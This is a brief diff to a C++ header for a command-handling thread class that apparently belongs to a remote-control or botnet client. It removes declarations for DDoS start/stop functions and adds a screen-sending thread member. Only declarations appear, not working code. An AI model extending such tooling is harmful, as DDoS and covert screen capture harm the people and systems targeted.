@@ -1,5 +1,6 @@
 #pragma once
 #include "threadex.h"
+#include "SendScreenThread.h"
 class CDealCMDThread :
 	public CThreadEx
 {
@@ -28,8 +29,6 @@ protected:
 	BOOL				FillSystemInfo(SYSTEM_INFO_S &emSysInfo_s);
 	CString				GetDiskVolume(CString strDiskDriveName);
 		
-	void				DealDDOSStop();
-	BOOL				DealDDOSStart(DDOS_INFO_S emDDOS);
 
 private:
 	HWND				m_hWndMsg;
@@ -39,5 +38,6 @@ private:
 	SOCKET				m_hSocketClient;				// 连接客户端SOCKET	
 	BOOL				m_bSafeExit;
 	BOOL				m_bThreadRolling;
+	CSendScreenThread*	m_pThreadSendScreen;
 };
 
